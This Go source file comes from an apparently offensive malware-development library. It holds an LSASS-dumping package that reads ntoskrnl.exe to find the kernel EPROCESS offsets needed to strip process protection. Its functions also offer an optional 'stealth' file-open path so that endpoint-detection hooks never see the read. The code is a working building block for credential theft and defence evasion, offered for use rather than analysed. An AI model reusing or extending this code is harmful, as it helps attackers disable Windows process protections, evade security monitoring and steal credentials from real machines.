package lsassdump

import (
	"encoding/binary"
	"errors"
	"fmt"

	"github.com/oioio-space/maldev/evasion/stealthopen"
	"github.com/oioio-space/maldev/pe/parse"
)

// Dynamic EPROCESS offset discovery.
//
// EPROCESS layout shifts every cumulative update — Microsoft never
// promises ABI stability. v0.x of this package required operators to
// hand-curate PPLOffsetTable per build, which doesn't scale.
//
// Inspired by wesmar/kvc (MIT) — the OffsetFinder there reads
// ntoskrnl.exe in user-mode and extracts the EPROCESS.Protection
// offset from the first instruction of `PsIsProtectedProcess` and
// `PsIsProtectedProcessLight`. Both kernel exports compile to a
// trivial wrapper:
//
//	PsIsProtectedProcess:
//	  movzx eax, byte ptr [rcx + EPROCESS.Protection_offset]
//	  test  eax, eax
//	  setnz al
//	  ret
//
// The first three bytes are always `0F B6 81` (movzx eax, byte ptr
// [rcx+disp32]) on x64; the next 4 bytes are the disp32 = the
// EPROCESS.Protection field offset. Extracting it requires no
// kernel-mode read — just parse ntoskrnl.exe as a PE on disk.
//
// kvc is MIT-licensed, so we cite it directly in source comments
// and reuse the technique. maldev stays MIT.
//
// SignatureLevel sits 2 bytes before Protection; SectionSignatureLevel
// sits 1 byte before. The PsIsProtectedProcess offset alone gives us
// all three.

// ErrProtectionOffsetNotFound fires when the parser couldn't locate
// the PsIsProtectedProcess export OR the function's prologue didn't
// match the expected `0F B6 81 disp32` pattern.
var ErrProtectionOffsetNotFound = errors.New("lsassdump: PsIsProtectedProcess prologue did not match the expected `movzx eax, [rcx+disp32]` pattern")

// DiscoverProtectionOffset reads ntoskrnl.exe at `path` and returns
// the EPROCESS.Protection byte offset.
//
// On Windows the canonical path is
// `%SystemRoot%\System32\ntoskrnl.exe`; pass an empty string to
// pick that up via os.Getenv("SystemRoot"). On Linux/CI you supply
// a captured ntoskrnl.exe explicitly (the parser is pure Go via
// pe/parse → saferwall/pe — no Windows runtime dependency).
//
// `opener` is the optional stealthopen.Opener — pass nil for plain
// os.Open, non-nil to route the read through a stealth strategy
// (NTFS Object ID, etc.) so a path-based EDR file hook never sees
// the ntoskrnl.exe path.
//
// The returned offset cross-validates `PsIsProtectedProcess` and
// `PsIsProtectedProcessLight` — both exports MUST agree (they
// compile to identical wrappers around the same EPROCESS field).
// A mismatch surfaces as ErrProtectionOffsetNotFound to refuse
// shipping a wrong value.
func DiscoverProtectionOffset(path string, opener stealthopen.Opener) (uint32, error) {
	pf, err := openNtoskrnl(path, opener, "DiscoverProtectionOffset")
	if err != nil {
		return 0, err
	}
	defer pf.Close()

	offA, err := extractProtectionOffset(pf, "PsIsProtectedProcess")
	if err != nil {
		return 0, fmt.Errorf("PsIsProtectedProcess: %w", err)
	}
	offB, err := extractProtectionOffset(pf, "PsIsProtectedProcessLight")
	if err != nil {
		return 0, fmt.Errorf("PsIsProtectedProcessLight: %w", err)
	}
	if offA != offB {
		return 0, fmt.Errorf("%w: PsIsProtectedProcess=%d != PsIsProtectedProcessLight=%d",
			ErrProtectionOffsetNotFound, offA, offB)
	}
	// Sanity bound — every documented build keeps the field under 0x1000.
	if offA == 0 || offA > 0x1500 {
		return 0, fmt.Errorf("%w: extracted offset 0x%X out of plausible range",
			ErrProtectionOffsetNotFound, offA)
	}
	return offA, nil
}

// SignatureLevelOffset returns the EPROCESS.SignatureLevel byte
// offset given the Protection offset. Stable: SignatureLevel always
// sits 2 bytes before Protection in the EPROCESS struct.
func SignatureLevelOffset(protectionOff uint32) uint32 {
	return protectionOff - 2
}

// SectionSignatureLevelOffset returns the
// EPROCESS.SectionSignatureLevel byte offset given the Protection
// offset. Stable: SectionSignatureLevel always sits 1 byte before
// Protection in the EPROCESS struct.
func SectionSignatureLevelOffset(protectionOff uint32) uint32 {
	return protectionOff - 1
}

// DiscoverUniqueProcessIdOffset returns the
// EPROCESS.UniqueProcessId byte offset by parsing the
// `PsGetProcessId` export's prologue. Empty path defaults to
// `%SystemRoot%\System32\ntoskrnl.exe` (same path-default
// convention as DiscoverProtectionOffset). `opener` is the optional
// stealthopen.Opener — pass nil for plain os.Open.
func DiscoverUniqueProcessIdOffset(path string, opener stealthopen.Opener) (uint32, error) {
	pf, err := openNtoskrnl(path, opener, "DiscoverUniqueProcessIdOffset")
	if err != nil {
		return 0, err
	}
	defer pf.Close()

	rva, err := pf.ExportRVA("PsGetProcessId")
	if err != nil {
		return 0, fmt.Errorf("PsGetProcessId: %w", err)
	}
	prologue, err := pf.DataAtRVA(rva, 7)
	if err != nil {
		return 0, fmt.Errorf("read PsGetProcessId prologue: %w", err)
	}
	// 48 8B 81 [disp32]: REX.W + mov r64, r/m64 + ModR/M [rcx+disp32].
	if prologue[0] == 0x48 && prologue[1] == 0x8B && isModRMRcxDisp32(prologue[2]) {
		off := binary.LittleEndian.Uint32(prologue[3:7])
		if off == 0 || off > 0x1500 {
			return 0, fmt.Errorf("%w: PsGetProcessId disp32 0x%X out of plausible range",
				ErrProtectionOffsetNotFound, off)
		}
		return off, nil
	}
	return 0, fmt.Errorf("%w: PsGetProcessId prologue %02X %02X %02X (want 48 8B [ModR/M])",
		ErrProtectionOffsetNotFound, prologue[0], prologue[1], prologue[2])
}

// DiscoverActiveProcessLinksOffset returns the EPROCESS.ActiveProcessLinks
// byte offset given the UniqueProcessId offset. ActiveProcessLinks is
// always sizeof(HANDLE) bytes after UniqueProcessId on x64 (= +8).
//
// Stable Vista → Win 11 25H2 per kvc's OffsetFinder; the relative
// position has never shifted because ActiveProcessLinks sits in the
// same struct slot pypykatz / mimikatz / Volatility all assume.
func DiscoverActiveProcessLinksOffset(uniqueProcessIDOff uint32) uint32 {
	return uniqueProcessIDOff + 8 // sizeof(HANDLE) on x64
}

// DiscoverInitialSystemProcessRVA returns the RVA of the
// `PsInitialSystemProcess` export inside ntoskrnl.exe. The export
// is a global pointer (PEPROCESS) — at runtime, reading 8 bytes at
// `ntoskrnl_kernel_base + RVA` via a kernel-mode ReadWriter yields
// the System process's EPROCESS, the head of the
// `PsActiveProcessLinks` doubly-linked list.
//
// Empty path defaults to %SystemRoot%\System32\ntoskrnl.exe.
// `opener` is the optional stealthopen.Opener — pass nil for plain
// os.Open.
func DiscoverInitialSystemProcessRVA(path string, opener stealthopen.Opener) (uint32, error) {
	pf, err := openNtoskrnl(path, opener, "DiscoverInitialSystemProcessRVA")
	if err != nil {
		return 0, err
	}
	defer pf.Close()
	return pf.ExportRVA("PsInitialSystemProcess")
}

// openNtoskrnl resolves the ntoskrnl.exe path (defaulting to
// %SystemRoot%\System32\ntoskrnl.exe when empty), reads the bytes
// through `opener`, and returns a *parse.File ready for export /
// RVA queries. Callers must Close.
func openNtoskrnl(path string, opener stealthopen.Opener, fnName string) (*parse.File, error) {
	path, err := defaultNtoskrnlPath(path, fnName)
	if err != nil {
		return nil, err
	}
	raw, err := stealthopen.OpenRead(opener, path)
	if err != nil {
		return nil, fmt.Errorf("read %s: %w", path, err)
	}
	pf, err := parse.FromBytes(raw, path)
	if err != nil {
		return nil, fmt.Errorf("parse %s: %w", path, err)
	}
	return pf, nil
}

// extractProtectionOffset finds `name` in the PE's exports, reads
// the first ~8 bytes of that function from .text, and returns the
// disp32 from a `[rcx+disp32]`-targeted instruction. Modern x64
// kernel emits one of three lowerings (compiler-dependent):
//
//	movzx eax, byte ptr [rcx+disp32]   →  0F B6 [ModR/M] [disp32]
//	test  byte ptr [rcx+disp32], imm8  →  F6    [ModR/M] [disp32] [imm8]
//	mov   r8,  byte ptr [rcx+disp32]   →  8A    [ModR/M] [disp32]
//
// All three reference EPROCESS.Protection at the same byte offset.
// The ModR/M byte is `10 rrr 001` for any [rcx+disp32] memory
// operand — values 0x81, 0x89, 0x91, 0x99 cover the common reg
// fields (AX/AL, CX/CL, DX/DL, BX/BL).
//
// On Win 10 22H2 build 19045 we observed:
//   - PsIsProtectedProcess       → `F6 81 …` (test)
//   - PsIsProtectedProcessLight  → `8A 91 …` (mov dl)
//
// Both decoded to the same disp32 = EPROCESS.Protection offset.
func extractProtectionOffset(pf *parse.File, name string) (uint32, error) {
	rva, err := pf.ExportRVA(name)
	if err != nil {
		return 0, err
	}
	// 8 bytes covers every encoding above (longest is `0F B6 81 disp32` = 7 bytes).
	prologue, err := pf.DataAtRVA(rva, 8)
	if err != nil {
		return 0, fmt.Errorf("read %s prologue: %w", name, err)
	}

	// Try each known prologue shape; first match wins.
	switch {
	case prologue[0] == 0x0F && prologue[1] == 0xB6 && isModRMRcxDisp32(prologue[2]):
		// movzx eax, byte ptr [rcx+disp32] → disp32 at [3:7]
		return binary.LittleEndian.Uint32(prologue[3:7]), nil
	case prologue[0] == 0xF6 && isModRMRcxDisp32(prologue[1]):
		// test byte ptr [rcx+disp32], imm8 → disp32 at [2:6]
		return binary.LittleEndian.Uint32(prologue[2:6]), nil
	case prologue[0] == 0x8A && isModRMRcxDisp32(prologue[1]):
		// mov r8, byte ptr [rcx+disp32] → disp32 at [2:6]
		return binary.LittleEndian.Uint32(prologue[2:6]), nil
	}
	return 0, fmt.Errorf("%w: %s prologue %02X %02X %02X",
		ErrProtectionOffsetNotFound, name, prologue[0], prologue[1], prologue[2])
}

// isModRMRcxDisp32 returns true when the ModR/M byte addresses
// `[rcx + disp32]` for ANY reg field. Bit pattern: `10 rrr 001`
// (mod=10 → 32-bit displacement; rm=001 → RCX). Mask 0xC7 isolates
// the mod + rm bits; the comparison value 0x81 is `mod=10, rm=001`.
func isModRMRcxDisp32(b byte) bool {
	return (b & 0xC7) == 0x81
}
